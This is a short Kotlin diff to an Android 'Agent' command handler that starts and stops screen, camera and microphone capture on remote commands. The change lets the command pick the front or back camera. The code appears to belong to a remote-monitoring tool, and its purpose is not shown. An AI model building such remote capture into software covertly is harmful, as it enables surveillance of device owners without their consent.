@@ -148,7 +148,11 @@ object Agent {
             // and camera start directly once their runtime permission is granted.
             "START_SCREEN" -> { log("START_SCREEN"); ScreenCaptureModule.start(appContext) }
             "STOP_SCREEN" -> { log("STOP_SCREEN"); ScreenCaptureModule.stop(appContext) }
-            "START_CAMERA" -> { log("START_CAMERA"); CameraModule.start(appContext) }
+            "START_CAMERA" -> {
+                val facing = msg.optJSONObject("payload")?.optString("facing", "back") ?: "back"
+                log("START_CAMERA ($facing)")
+                CameraModule.start(appContext, facing)
+            }
             "STOP_CAMERA" -> { log("STOP_CAMERA"); CameraModule.stop() }
             "START_MIC" -> { log("START_MIC"); MicModule.start(appContext) }
             "STOP_MIC" -> { log("STOP_MIC"); MicModule.stop() }
